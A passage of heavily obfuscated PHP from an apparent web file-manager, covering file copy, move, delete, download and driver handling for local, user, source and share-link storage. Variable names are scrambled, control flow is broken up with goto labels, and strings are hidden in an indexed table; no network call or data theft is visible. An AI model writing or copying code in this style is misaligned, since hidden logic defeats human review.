Model($Eô³¥â¬Û¶[167])->where($F¥•„˜¿Æœ)->field($Eô³¥â¬Û¶[2383])->select(); foreach ($c‚‘¸íÆë¾ as $cäà´‹÷Ô†) { goto Cæ®÷Ş¶; c­ƒ§Á“ÒÕ: $E…‰…Ğ = array($Eô³¥â¬Û¶[740] => $b»¹·™‘£, $Eô³¥â¬Û¶[75] => $DÉèá¦ìÄ¦); Model($Eô³¥â¬Û¶[167])->where($F¥•„˜¿Æœ)->save($E…‰…Ğ); goto C¾å„´¬Ëâ; Cæ®÷Ş¶: $a´½ÎËÊ©à = $cäà´‹÷Ô†[$Eô³¥â¬Û¶[75]]; $DÉèá¦ìÄ¦ = $bê¡†ÅœâŸ . str_replace("\x7b\151\x6f\x3a{$fàéØÇâí¢}\x7d\57", $Eô³¥â¬Û¶[33], $a´½ÎËÊ©à); if (!IO::exist($a´½ÎËÊ©à)) { $BèÇ‹ÊÌÇ½[] = $cäà´‹÷Ô†[$Eô³¥â¬Û¶[419]]; $e§¤ƒÍ¬õÄ->updateFileEnd($cäà´‹÷Ô†[$Eô³¥â¬Û¶[28]], $cäà´‹÷Ô†[$Eô³¥â¬Û¶[77]]); continue; } goto Aè£—İÛÙ; Aè£—İÛÙ: if (IO::exist($DÉèá¦ìÄ¦)) { $e§¤ƒÍ¬õÄ->updateFileEnd($cäà´‹÷Ô†[$Eô³¥â¬Û¶[28]], $cäà´‹÷Ô†[$Eô³¥â¬Û¶[77]]); continue; } if (!IO::move($a´½ÎËÊ©à, get_path_father($DÉèá¦ìÄ¦))) { $bÌ®º¦°Ùá = !1; break; } $F¥•„˜¿Æœ = array($Eô³¥â¬Û¶[419] => $cäà´‹÷Ô†[$Eô³¥â¬Û¶[419]]); goto c­ƒ§Á“ÒÕ; C¾å„´¬Ëâ: } $this->removeByFileID($BèÇ‹ÊÌÇ½); goto A·Ï®¯¡ó‘; EäëÂÏÏÊÓ: $a„¦„Ğ©æÍ = Model($Eô³¥â¬Û¶[422])->where($F¥•„˜¿Æœ)->sum($Eô³¥â¬Û¶[77]); $d‚«íÆ»ÂÁ = $Eô³¥â¬Û¶[2380] . $fàéØÇâí¢; $e§¤ƒÍ¬õÄ = new TaskFileTransfer($d‚«íÆ»ÂÁ, $Eô³¥â¬Û¶[2381], $A¦ ¬¢æäË, LNG($Eô³¥â¬Û¶[2382]) . "\50{$fàéØÇâí¢}\x29"); goto CğÑÍğÛ¦Ñ; CÌôŒƒãØì: } public function progress($bæ´‚¯ÁÖÚ) { return Task::get($_SERVER[¼€¼ˆ¦‚¡][2380] . $bæ´‚¯ÁÖÚ); } private function removeByFileID($EŒ´¦¾ÄÙö = array()) { goto CİÏ‹‡±ÂÌ; CİÏ‹‡±ÂÌ: $E‚è¦†– =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($EŒ´¦¾ÄÙö)) { return; } $aè ëƒ°µ = array($E‚è¦†–[419] => array($E‚è¦†–[7], $EŒ´¦¾ÄÙö)); goto f˜øÕ‰Æ”ì; f§™àíÀÃß: foreach ($BªîóçÍé as $cÔ‚´œï«…) { Model($E‚è¦†–[382])->removeNow($cÔ‚´œï«…, !1); } goto AÃ‚Ü¼‡»„; f˜øÕ‰Æ”ì: $BªîóçÍé = Model($E‚è¦†–[1117])->where($aè ëƒ°µ)->field($E‚è¦†–[369])->select(); if (!$BªîóçÍé) { return; } $BªîóçÍé = array_to_keyvalue($BªîóçÍé, $E‚è¦†–[33], $E‚è¦†–[369]); goto f§™àíÀÃß; AÃ‚Ü¼‡»„: } private function removeShareItems($AÄŸµòí•‡) { goto c‰ó„”¸…‹; c‰ó„”¸…‹: $Fõ½ÖÔ¸î =& $_SERVER[¼€¼ˆ¦‚¡]; $a¥†«¦ĞíÚ = "\x7b\151\157\72{$AÄŸµòí•‡}\x7d\57"; $c‘ÀÔ”ã™ = array($Fõ½ÖÔ¸î[369] => 0, $Fõ½ÖÔ¸î[1018] => array($Fõ½ÖÔ¸î[748], "{$a¥†«¦ĞíÚ}\45")); goto bƒÛæá„Ú­; bƒÛæá„Ú­: $bÔÜÈ£™ = Model($Fõ½ÖÔ¸î[2082])->where($c‘ÀÔ”ã™)->field($Fõ½ÖÔ¸î[441])->select(); if (empty($bÔÜÈ£™)) { return; } $E¼ÖÎÓõÜ = array_to_keyvalue($bÔÜÈ£™, $Fõ½ÖÔ¸î[33], $Fõ½ÖÔ¸î[441]); goto e­Âò½³µ‹; e­Âò½³µ‹: Model($Fõ½ÖÔ¸î[536])->remove($E¼ÖÎÓõÜ); goto b¢É¢‚ÇÕå; b¢É¢‚ÇÕå: } } goto e¬Â´†øÓ¡; aäåÕÑ Í: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($cÒÆÄ¡ìƒè, $eÁ¡Ÿ¿ùï±) { $DğäŒß±Ä‡ = self::driverMake($eÁ¡Ÿ¿ùï±[0]); if (method_exists($DğäŒß±Ä‡, $cÒÆÄ¡ìƒè)) { return @call_user_func_array(array($DğäŒß±Ä‡, $cÒÆÄ¡ìƒè), $eÁ¡Ÿ¿ùï±); } if (method_exists($DğäŒß±Ä‡, $_SERVER[¼€¼ˆ¦‚¡][996])) { return @call_user_func_array(array($DğäŒß±Ä‡, $cÒÆÄ¡ìƒè), $eÁ¡Ÿ¿ùï±); } else { if (method_exists(self, $cÒÆÄ¡ìƒè)) { return @call_user_func_array(array(self, $cÒÆÄ¡ìƒè), $eÁ¡Ÿ¿ùï±); } else { call_user_func_array(array(parent, $cÒÆÄ¡ìƒè), $eÁ¡Ÿ¿ùï±); } } } public static function init($A©Õ™¿²Œ†) { return self::driverMake($A©Õ™¿²Œ†); } public static function copy($FÊ‹š•ÂÓ, $fÑß¼Æ…¨, $eÕğÒôãó± = false, $c‰Œ…Ğ¸² = false) { return self::copyMove($FÊ‹š•ÂÓ, $fÑß¼Æ…¨, $eÕğÒôãó±, $_SERVER[¼€¼ˆ¦‚¡][490], $c‰Œ…Ğ¸²); } public static function move($B´åã£¼¸, $f–Î‹ñèˆ¡, $D†Êç¿öÂ› = false, $eÉ£Ê¸‹ª  = false) { return self::copyMove($B´åã£¼¸, $f–Î‹ñèˆ¡, $D†Êç¿öÂ›, $_SERVER[¼€¼ˆ¦‚¡][492], $eÉ£Ê¸‹ª ); } public static function saveFile($AôÈÇƒÖ·, $b¢ßÓè¤êÍ, $eàïœ¶¥©ö = true) { goto EÀËËÜ¬Ú ; FØ‘•’ì: $bä¥‹ÌŒå­ = $A„­ ¢ˆ¸°->pathFather($b¢ßÓè¤êÍ); $EôªÚ©×ˆ× = !0; if (!$eàïœ¶¥©ö && self::driverIsSame($D¢‹á›İÉ„, $A„­ ¢ˆ¸°)) { $EôªÚ©×ˆ× = !1; } goto c¥ÍòëˆßÊ; f˜•«ñµ…: $A„­ ¢ˆ¸° = self::driverMake($b¢ßÓè¤êÍ); $aÅœ‡Â“¶Å = !1; if ($A„­ ¢ˆ¸°->pathParse[$C£é…­ŒğĞ[997]]) { $bœìÉ§Ñ— = $A„­ ¢ˆ¸°->pathParse[$C£é…­ŒğĞ[997]]; $aÅœ‡Â“¶Å = $A„­ ¢ˆ¸°; $A„­ ¢ˆ¸° = self::driverMake($bœìÉ§Ñ—); } goto FØ‘•’ì; EÀËËÜ¬Ú : $C£é…­ŒğĞ =& $_SERVER[¼€¼ˆ¦‚¡]; $AğÎá§Á™© = self::info($b¢ßÓè¤êÍ); $D¢‹á›İÉ„ = self::driverMake($AôÈÇƒÖ·); goto f˜•«ñµ…; c¥ÍòëˆßÊ: $eõ¥´ê†ö = self::copyFile($D¢‹á›İÉ„, $AôÈÇƒÖ·, $A„­ ¢ˆ¸°, $bä¥‹ÌŒå­, $AğÎá§Á™©[$C£é…­ŒğĞ[28]], $EôªÚ©×ˆ×); if ($aÅœ‡Â“¶Å) { $eõ¥´ê†ö = $aÅœ‡Â“¶Å->getPathOuter($eõ¥´ê†ö); } return $eõ¥´ê†ö; goto a²¶öœëò; a²¶öœëò: } private static function copyMove($b˜¨·„‰Éá, $c„®ˆÔ•Ùµ, $d´¾ùßÚ·¯, $E÷…í‹ÑÉ, $E¹è’¼Æ• = false) { goto dİ‡‘ìÍªé; dİ‡‘ìÍªé: $d‚°’†”  =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$b˜¨·„‰Éá || $b˜¨·„‰Éá == $d‚°’†” [8] || !$c„®ˆÔ•Ùµ) { return !1; } ignore_timeout(); goto A—ªãÂ»¼Ä; aÏñŒŞ¯¾: Hook::trigger($d‚°’†” [72], $eàÇÀÎÂÑŒ, $b˜¨·„‰Éá, $A…³›ØĞ½, $c„®ˆÔ•Ùµ); $eˆø™Œ = self::driverIsSame($eàÇÀÎÂÑŒ, $A…³›ØĞ½); if ($eˆø™Œ) { if ($E÷…í‹ÑÉ == $d‚°’†” [492] && !method_exists($A…³›ØĞ½, $d‚°’†” [998]) && trim($c„®ˆÔ•Ùµ, $d‚°’†” [8]) == trim($A…³›ØĞ½->pathFather($b˜¨·„‰Éá), $d‚°’†” [8])) { return $A…³›ØĞ½->getPathOuter($b˜¨·„‰Éá); } if (method_exists($A…³›ØĞ½, $E÷…í‹ÑÉ)) { return $A…³›ØĞ½->{$E÷…í‹ÑÉ}($b˜¨·„‰Éá, $c„®ˆÔ•Ùµ, $d´¾ùßÚ·¯); } } goto c‚Ô¯­—èõ; cÖ ‘ˆÃ¤ğ: $f°ÉîàÂç´ = !1; if ($A…³›ØĞ½->pathParse[$d‚°’†” [997]]) { $c„®ˆÔ•Ùµ = $A…³›ØĞ½->pathParse[$d‚°’†” [997]]; $f°ÉîàÂç´ = $A…³›ØĞ½; $A…³›ØĞ½ = self::driverMake($c„®ˆÔ•Ùµ); } self::check($eàÇÀÎÂÑŒ, $b˜¨·„‰Éá, $A…³›ØĞ½, $c„®ˆÔ•Ùµ); goto aÏñŒŞ¯¾; eæ‹èÉŞÄ: if ($f°ÉîàÂç´) { $Eˆ›ŒÏ¡‹ = $f°ÉîàÂç´->getPathOuter($Eˆ›ŒÏ¡‹); } return $Eˆ›ŒÏ¡‹; goto e¯œÂíÃò; A—ªãÂ»¼Ä: $eàÇÀÎÂÑŒ = self::driverMake($b˜¨·„‰Éá); $A…³›ØĞ½ = self::driverMake($c„®ˆÔ•Ùµ); $Eš¹”Ñ²·‹ = $E÷…í‹ÑÉ == $d‚°’†” [492]; goto cÖ ‘ˆÃ¤ğ; c‚Ô¯­—èõ: $cÆßæ¤‰ã´ = $eàÇÀÎÂÑŒ->isFile($b˜¨·„‰Éá); if (!$cÆßæ¤‰ã´ && $A…³›ØĞ½->getType() == $d‚°’†” [690] && $eàÇÀÎÂÑŒ->getType() == $d‚°’†” [102]) { $Eˆ›ŒÏ¡‹ = $A…³›ØĞ½->copyFolderFromIO($eàÇÀÎÂÑŒ, $b˜¨·„‰Éá, $c„®ˆÔ•Ùµ, $d´¾ùßÚ·¯, $Eš¹”Ñ²·‹, $E¹è’¼Æ•); } else { $Eˆ›ŒÏ¡‹ = self::copyPath($eàÇÀÎÂÑŒ, $b˜¨·„‰Éá, $A…³›ØĞ½, $c„®ˆÔ•Ùµ, $d´¾ùßÚ·¯, $Eš¹”Ñ²·‹, $cÆßæ¤‰ã´, $E¹è’¼Æ•); } if ($Eˆ›ŒÏ¡‹ && $Eš¹”Ñ²·‹) { $eàÇÀÎÂÑŒ->remove($b˜¨·„‰Éá); } goto eæ‹èÉŞÄ; e¯œÂíÃò: } private static function check($fŸêÉ÷ôçŠ, $AÏõõö×äã, $c»ºƒŠìƒ, &$DßŠÛ¶ÌÕ) { $aòÖåŠß =& $_SERVER[¼€¼ˆ¦‚¡]; if (self::driverIsSame($fŸêÉ÷ôçŠ, $c»ºƒŠìƒ) && $fŸêÉ÷ôçŠ->isFolder($AÏõõö×äã) && $fŸêÉ÷ôçŠ->isParentOf($AÏõõö×äã, $DßŠÛ¶ÌÕ)) { show_json(LNG($aòÖåŠß[999]), !1); } if (!$fŸêÉ÷ôçŠ->exist($AÏõõö×äã)) { show_json(LNG($aòÖåŠß[101]), !1); } } private static function copyPath($fŒãÉ¬È»², $CÙôƒãĞÜö, $EéÔ¥ôò‡, $F¸­š•²è, $e—¡¾©¨œà, $b‹ó¬ğ–£, $DèÇòºŸê±, $dà¦š²Õõ‚ = false) { goto bù±­•ªµ; E‰¥µ†±Œ™: if ($DèÇòºŸê±) { return self::copyFile($fŒãÉ¬È»², $CÙôƒãĞÜö, $EéÔ¥ôò‡, $F¸­š•²è, $E ÊË“²Ò, $b‹ó¬ğ–£); } if ($e—¡¾©¨œà == REPEAT_RENAME_FOLDER) { $e—¡¾©¨œà = !1; } $fİîÏ¸Ù³ = rtrim($F¸­š•²è, $bÉšÅĞ“ã³[8]) . $bÉšÅĞ“ã³[8] . $E ÊË“²Ò; goto EŠ…íÔóÔÆ; EŠ…íÔóÔÆ: $EÇà¶öÅñ– = $EéÔ¥ôò‡->mkdir($EéÔ¥ôò‡->getPath($fİîÏ¸Ù³)); $F¸­š•²è = $EéÔ¥ôò‡->getPathInner($EÇà¶öÅñ–); $fè¹ÚÅ¤ÀŠ = $fŒãÉ¬È»²->listPath($CÙôƒãĞÜö, !0); goto e°çøÉ­ç; bù±­•ªµ: $bÉšÅĞ“ã³ =& $_SERVER[¼€¼ˆ¦‚¡]; $E ÊË“²Ò = $dà¦š²Õõ‚ ? $dà¦š²Õõ‚ : $fŒãÉ¬È»²->getPathName($fŒãÉ¬È»²->pathThis($CÙôƒãĞÜö)); if ($e—¡¾©¨œà) { $BÑ“®ºñ§ä = $EéÔ¥ôò‡->fileNameExist($F¸­š•²è, $E ÊË“²Ò); $E ÊË“²Ò = $EéÔ¥ôò‡->fileNameAuto($F¸­š•²è, $E ÊË“²Ò, $e—¡¾©¨œà, !$DèÇòºŸê±); $e—¡¾©¨œà = $BÑ“®ºñ§ä ? $e—¡¾©¨œà : !1; } goto E‰¥µ†±Œ™; e°çøÉ­ç: $b¶È¥º†æÍ = array_merge($fè¹ÚÅ¤ÀŠ[$bÉšÅĞ“ã³[73]], $fè¹ÚÅ¤ÀŠ[$bÉšÅĞ“ã³[74]]); foreach ($b¶È¥º†æÍ as $A£Êµù™) { $Eªš²ïŸô = $A£Êµù™[$bÉšÅĞ“ã³[29]] == $bÉšÅĞ“ã³[167]; $CÙôƒãĞÜö = $fŒãÉ¬È»²->getPathInner($A£Êµù™[$bÉšÅĞ“ã³[75]]); $E²ğ½Ó’¡Œ = self::copyPath($fŒãÉ¬È»², $CÙôƒãĞÜö, $EéÔ¥ôò‡, $F¸­š•²è, $e—¡¾©¨œà, $b‹ó¬ğ–£, $Eªš²ïŸô); if (!$E²ğ½Ó’¡Œ) { write_log($bÉšÅĞ“ã³[1000] . $CÙôƒãĞÜö . $bÉšÅĞ“ã³[1001] . $F¸­š•²è, $bÉšÅĞ“ã³[1002]); } } return $EÇà¶öÅñ–; goto CØ ß£¼ìÎ; CØ ß£¼ìÎ: } private static function copyFile($Eë¶äÇ²·™, $e²³õó¢«Ì, $Cƒ‚ˆ°ÄâÂ, $CÔ±Ô”á‹õ, $bŸÆñ¸ñ, $EèÆÅçˆÂõ) { goto EæÈâ‚®«; E¥Ãóô™æ: mk_dir($CƒÑˆ‡œ·÷); $fïŠ†é©É = $CƒÑˆ‡œ·÷ . $Bœ¤èĞ­Ÿ; $fïŠ†é©É = $Eë¶äÇ²·™->download($e²³õó¢«Ì, $fïŠ†é©É); goto E¦²Š ¢‘İ; dÁº«åÍ: Hook::trigger($cØÀ¯ÛÙ¿è[1005], $Eë¶äÇ²·™, $e²³õó¢«Ì, $Cƒ‚ˆ°ÄâÂ, $CÔ±Ô”á‹õ, $bŸÆñ¸ñ, $B©Êé«Î); return $B©Êé«Î; goto d¡ã÷ô£Ş¢; E¦²Š ¢‘İ: $fïŠ†é©É = $Eë¶äÇ²·™->iconvApp($fïŠ†é©É); $B©Êé«Î = $Cƒ‚ˆ°ÄâÂ->upload($CÔ±Ô”á‹õ, $fïŠ†é©É, $EèÆÅçˆÂõ); self::remove($CƒÑˆ‡œ·÷ . $Bœ¤èĞ­Ÿ); goto dÁº«åÍ; EæÈâ‚®«: $cØÀ¯ÛÙ¿è =& $_SERVER[¼€¼ˆ¦‚¡]; $CÔ±Ô”á‹õ = $Cƒ‚ˆ°ÄâÂ->getPath(rtrim($CÔ±Ô”á‹õ, $cØÀ¯ÛÙ¿è[8]) . $cØÀ¯ÛÙ¿è[8] . $bŸÆñ¸ñ); $Bœ¤èĞ­Ÿ = $cØÀ¯ÛÙ¿è[1003] . time() . rand_string(5); goto e•÷¼œİ®´; e•÷¼œİ®´: Hook::trigger($cØÀ¯ÛÙ¿è[1004], $Eë¶äÇ²·™, $e²³õó¢«Ì, $Cƒ‚ˆ°ÄâÂ, $CÔ±Ô”á‹õ, $bŸÆñ¸ñ, $Bœ¤èĞ­Ÿ); if (self::driverIsSame($Eë¶äÇ²·™, $Cƒ‚ˆ°ÄâÂ)) { if ($EèÆÅçˆÂõ) { $B©Êé«Î = $Cƒ‚ˆ°ÄâÂ->moveFile($e²³õó¢«Ì, $CÔ±Ô”á‹õ); } else { $B©Êé«Î = $Cƒ‚ˆ°ÄâÂ->copyFile($e²³õó¢«Ì, $CÔ±Ô”á‹õ); } Hook::trigger($cØÀ¯ÛÙ¿è[1005], $Eë¶äÇ²·™, $e²³õó¢«Ì, $Cƒ‚ˆ°ÄâÂ, $CÔ±Ô”á‹õ, $bŸÆñ¸ñ, $B©Êé«Î); return $B©Êé«Î; } $CƒÑˆ‡œ·÷ = TEMP_FILES; goto E¥Ãóô™æ; d¡ã÷ô£Ş¢: } public static function pathFather($E£±†ƒ‘Á„) { $B™õÏŠó‚î = IO::init($E£±†ƒ‘Á„); $D ”¡›ùÊ = $B™õÏŠó‚î->pathFather($B™õÏŠó‚î->path); return $B™õÏŠó‚î->getPathOuter($D ”¡›ùÊ); } public static function fileOut($fàó¸šÓË, $aÌ’·ÁĞÏà = false, $f“ŒÃ¥–¼ = false, $BÜˆÍÇ’–¡ = '') { $a¸øÖôÉÖ¨ = self::driverMake($fàó¸šÓË); if ($a¸øÖôÉÖ¨->isFileOutServer()) { return $a¸øÖôÉÖ¨->fileOutServer($fàó¸šÓË, $aÌ’·ÁĞÏà, $f“ŒÃ¥–¼, $BÜˆÍÇ’–¡); } return $a¸øÖôÉÖ¨->fileOut($fàó¸šÓË, $aÌ’·ÁĞÏà, $f“ŒÃ¥–¼, $BÜˆÍÇ’–¡); } public static function fileOutImage($BŒğ®§µ”Ÿ, $D¨Ÿ®È‘çŞ = 250) { $c¢öŞöÀâä = array(250, 600, 1200, 3000); for ($Fˆ·­Ù·¸È = 0; $Fˆ·­Ù·¸È < count($c¢öŞöÀâä); $Fˆ·­Ù·¸È++) { if ($Fˆ·­Ù·¸È == 0 && $D¨Ÿ®È‘çŞ <= $c¢öŞöÀâä[$Fˆ·­Ù·¸È]) { $D¨Ÿ®È‘çŞ = $c¢öŞöÀâä[$Fˆ·­Ù·¸È]; break; } else { if ($D¨Ÿ®È‘çŞ > $c¢öŞöÀâä[$Fˆ·­Ù·¸È - 1] && $D¨Ÿ®È‘çŞ <= $c¢öŞöÀâä[$Fˆ·­Ù·¸È]) { $D¨Ÿ®È‘çŞ = $c¢öŞöÀâä[$Fˆ·­Ù·¸È]; break; } else { if ($Fˆ·­Ù·¸È == count($c¢öŞöÀâä) - 1 && $D¨Ÿ®È‘çŞ > $c¢öŞöÀâä[$Fˆ·­Ù·¸È]) { $D¨Ÿ®È‘çŞ = $c¢öŞöÀâä[$Fˆ·­Ù·¸È]; break; } } } } $aØ™»¤“ìë = self::driverMake($BŒğ®§µ”Ÿ); if ($aØ™»¤“ìë->isFileOutServer()) { return $aØ™»¤“ìë->fileOutImageServer($BŒğ®§µ”Ÿ, $D¨Ÿ®È‘çŞ); } return $aØ™»¤“ìë->fileOutImage($BŒğ®§µ”Ÿ, $D¨Ÿ®È‘çŞ); } private static function driverIsSame($A†Ø¦İƒè, $cÌÒÍÏ¿ñ­) { goto A“ÃãŒÕØ; eŸÜ£İÒÂ: if ($A†Ø¦İƒè->pathDriver == $cÌÒÍÏ¿ñ­->pathDriver) { return !0; } return !1; goto d¥—•÷ô; A“ÃãŒÕØ: $cÄæí ïĞø =& $_SERVER[¼€¼ˆ¦‚¡]; $BéÔßæ°¿ = $A†Ø¦İƒè->getType(); $aèÎ×Š‘´ù = $cÌÒÍÏ¿ñ­->getType(); goto cŠéä…Ö¼ù; cŠéä…Ö¼ù: if ($BéÔßæ°¿ != $aèÎ×Š‘´ù) { return !1; } if ($BéÔßæ°¿ == $cÄæí ïĞø[690]) { return !0; } if ($BéÔßæ°¿ == $cÄæí ïĞø[102]) { return !0; } goto eŸÜ£İÒÂ; d¥—•÷ô: } public static function copyUpdate($AŠŞÔÇÆ, $f³•ƒòÚê­) { goto e†»î‘¸¾Ç; c¥™ëŠê…: $Fåª£©À¡ã = array(); foreach ($AŞ¬¾«ßé“ as $fË…„Ãàö => $eæÆäá¸â¿) { if (isset($C×ÂÒâéİã[$fË…„Ãàö])) { if ($eæÆäá¸â¿[$FÖ‹È¹Ê©‚[76]] == 1) { continue; } if ($C×ÂÒâéİã[$fË…„Ãàö][$FÖ‹È¹Ê©‚[77]] == $eæÆäá¸â¿[$FÖ‹È¹Ê©‚[77]]) { continue; } } if ($eæÆäá¸â¿[$FÖ‹È¹Ê©‚[76]] == 1) { $Fåª£©À¡ã[] = $f³•ƒòÚê­ . $FÖ‹È¹Ê©‚[8] . $fË…„Ãàö; continue; } $EÛ×Øœ…Á = strstr(trim($fË…„Ãàö, $FÖ‹È¹Ê©‚[8]), $FÖ‹È¹Ê©‚[8]) ? get_path_father($fË…„Ãàö) : $FÖ‹È¹Ê©‚[33]; $bÀ§Øåô–“[] = array($FÖ‹È¹Ê©‚[1006] => $eæÆäá¸â¿[$FÖ‹È¹Ê©‚[75]], $FÖ‹È¹Ê©‚[1007] => rtrim($f³•ƒòÚê­, $FÖ‹È¹Ê©‚[8]) . $FÖ‹È¹Ê©‚[8] . $EÛ×Øœ…Á, $FÖ‹È¹Ê©‚[1008] => $eæÆäá¸â¿); } $bğˆ¿ºÓÕˆ = array($FÖ‹È¹Ê©‚[167] => $bÀ§Øåô–“, $FÖ‹È¹Ê©‚[76] => $Fåª£©À¡ã); goto C“ŠïÕÎáÆ; e†»î‘¸¾Ç: $FÖ‹È¹Ê©‚ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!IO::exist($AŠŞÔÇÆ)) { return !1; } if (!IO::exist($f³•ƒòÚê­)) { IO::mkdir($f³•ƒòÚê­); } goto c›¬ë†–áæ; c›¬ë†–áæ: $AŞ¬¾«ßé“ = self::_listAll($AŠŞÔÇÆ); $C×ÂÒâéİã = self::_listAll($f³•ƒòÚê­); $bÀ§Øåô–“ = array(); goto c¥™ëŠê…; C“ŠïÕÎáÆ: Hook::trigger($FÖ‹È¹Ê©‚[1009], $AŠŞÔÇÆ, $f³•ƒòÚê­, $bğˆ¿ºÓÕˆ); foreach ($Fåª£©À¡ã as $eæÆäá¸â¿) { IO::mkdir($eæÆäá¸â¿); } foreach ($bÀ§Øåô–“ as $eæÆäá¸â¿) { IO::copy($eæÆäá¸â¿[$FÖ‹È¹Ê©‚[1006]], $eæÆäá¸â¿[$FÖ‹È¹Ê©‚[1007]], REPEAT_REPLACE); } goto Bì™îòƒ‹Ï; Bì™îòƒ‹Ï: } private static function _listAll($b…·„ñÓÍ) { $aßŸÎ„è¨Ÿ =& $_SERVER[¼€¼ˆ¦‚¡]; $b…·„ñÓÍ = KodIO::clear($b…·„ñÓÍ); $c»³±çñ¥ = IO::listAll($b…·„ñÓÍ); foreach ($c»³±çñ¥ as &$bêøµ”œšÌ) { $d¢í¶µ·¼ø = substr($bêøµ”œšÌ[$aßŸÎ„è¨Ÿ[75]], strlen($b…·„ñÓÍ)); $bêøµ”œšÌ[$aßŸÎ„è¨Ÿ[1010]] = trim($d¢í¶µ·¼ø, $aßŸÎ„è¨Ÿ[8]); } return array_to_keyvalue($c»³±çñ¥, $aßŸÎ„è¨Ÿ[1010]); } public static function fileSubstr($dßïÖÖ¹ÄÃ, $FÕË¯Ä½’¶, $D¬˜æ–ßŒÅ = false) { goto aæ¿§°ó¾; d‡„Ï¯–‰”: return $aøäåÌ¡›Õ->fileSubstr($dßïÖÖ¹ÄÃ, $FÕË¯Ä½’¶, $D¬˜æ–ßŒÅ); goto cò»ÄÄ—Á; aæ¿§°ó¾: $aøäåÌ¡›Õ = self::driverMake($dßïÖÖ¹ÄÃ); $d£Ü¿ãÆñÍ = $aøäåÌ¡›Õ->size($dßïÖÖ¹ÄÃ); $BŠÕ—Ğ¯” = $FÕË¯Ä½’¶; goto fŒÕç– —†; AçÔ‚šµá: if ($FÕË¯Ä½’¶ + $D¬˜æ–ßŒÅ > $d£Ü¿ãÆñÍ) { $D¬˜æ–ßŒÅ = $d£Ü¿ãÆñÍ - $FÕË¯Ä½’¶; } if ($D¬˜æ–ßŒÅ <= 0) { return $_SERVER[¼€¼ˆ¦‚¡][33]; } if ($FÕË¯Ä½’¶ < 0 || $FÕË¯Ä½’¶ >= $d£Ü¿ãÆñÍ || $D¬˜æ–ßŒÅ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\145\x52\x65\x61\144\x20\x65\x72\x72\x6f\x72\x21\40\x73\x74\x61\162\164\x3d{$FÕË¯Ä½’¶}\73\154\145\156\x67\164\150\x3d{$D¬˜æ–ßŒÅ}\x3b\x20\x73\x69\x7a\x65\x3d{$d£Ü¿ãÆñÍ}\73"); } goto d‡„Ï¯–‰”; fŒÕç– —†: $D –Ğ”Ñá = $D¬˜æ–ßŒÅ; if ($FÕË¯Ä½’¶ < 0) { $FÕË¯Ä½’¶ = $d£Ü¿ãÆñÍ + $FÕË¯Ä½’¶; } if ($D¬˜æ–ßŒÅ === !1) { $D¬˜æ–ßŒÅ = $d£Ü¿ãÆñÍ - $FÕË¯Ä½’¶; } goto AçÔ‚šµá; cò»ÄÄ—Á: } private static function driverMake(&$D†ÇêÚ¦´š) { goto eˆ‰ó‡øÓ; eˆ‰ó‡øÓ: $eÓÔ‚§–¶ù =& $_SERVER[¼€¼ˆ¦‚¡]; $Dè™Ìæå²Î = KodIO::parse($D†ÇêÚ¦´š); if (!self::$driverListSystem) { $D„Ëâ™‹­á = Model($eÓÔ‚§–¶ù[700])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($D„Ëâ™‹­á, $eÓÔ‚§–¶ù[367]); } goto eÑ¿æ«ŸËï; bĞ“®Æ´¹ê: return $E²Õ²÷˜ôô; goto cÓÙõ¿ï…‹; eÑ¿æ«ŸËï: if ($Dè™Ìæå²Î[$eÓÔ‚§–¶ù[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Dè™Ìæå²Î[$eÓÔ‚§–¶ù[367]]]) { return !1; } $D†ÇêÚ¦´š = $Dè™Ìæå²Î[$eÓÔ‚§–¶ù[1011]]; $E²Õ²÷˜ôô = self::driverGet($Dè™Ìæå²Î, $D†ÇêÚ¦´š); goto bĞ“®Æ´¹ê; cÓÙõ¿ï…‹: } private static function driverGet($Açœí¢•™Ÿ, &$D»É¬ğ¿ˆÖ) { goto a‘¶ İ•ä³; DŠã¹·†¾: switch ($Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[29]]) { case KodIO::KOD_IO: $a™¢¹ˆ£¦é = self::$driverListSystem[$eÖ²‡ò®–]; break; case KodIO::KOD_SOURCE: $D»É¬ğ¿ˆÖ = $eÖ²‡ò®– . $D»É¬ğ¿ˆÖ; $a™¢¹ˆ£¦é = array($DÙÍ½‹Ô‘ö[1013] => $DÙÍ½‹Ô‘ö[1014], $DÙÍ½‹Ô‘ö[6] => $Açœí¢•™Ÿ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $FÏ·³‹ƒğŸ = $GLOBALS[$DÙÍ½‹Ô‘ö[1015]]; self::$driverListUser = array_to_keyvalue($FÏ·³‹ƒğŸ, $DÙÍ½‹Ô‘ö[367]); } $a™¢¹ˆ£¦é = self::$driverListUser[$eÖ²‡ò®–]; break; case KodIO::KOD_SHARE_LINK: $a™¢¹ˆ£¦é = array($DÙÍ½‹Ô‘ö[1013] => $DÙÍ½‹Ô‘ö[1016], $DÙÍ½‹Ô‘ö[6] => $Açœí¢•™Ÿ); $c¸›Ì’Èƒ = Action($DÙÍ½‹Ô‘ö[1017])->sharePathInfo($Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[75]]); $D»É¬ğ¿ˆÖ = $c¸›Ì’Èƒ[$DÙÍ½‹Ô‘ö[369]]; if (!$c¸›Ì’Èƒ[$DÙÍ½‹Ô‘ö[369]]) { $aôàõƒ§„² = Model($DÙÍ½‹Ô‘ö[536])->getInfo($c¸›Ì’Èƒ[$DÙÍ½‹Ô‘ö[441]]); $D»É¬ğ¿ˆÖ = KodIO::clear($aôàõƒ§„²[$DÙÍ½‹Ô‘ö[1018]] . $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[1011]]); $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[439]] = $aôàõƒ§„²; $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[997]] = $D»É¬ğ¿ˆÖ; $a™¢¹ˆ£¦é = array($DÙÍ½‹Ô‘ö[1013] => $DÙÍ½‹Ô‘ö[1019], $DÙÍ½‹Ô‘ö[6] => $Açœí¢•™Ÿ); } break; case KodIO::KOD_SHARE_ITEM: $a™¢¹ˆ£¦é = array($DÙÍ½‹Ô‘ö[1013] => $DÙÍ½‹Ô‘ö[1020], 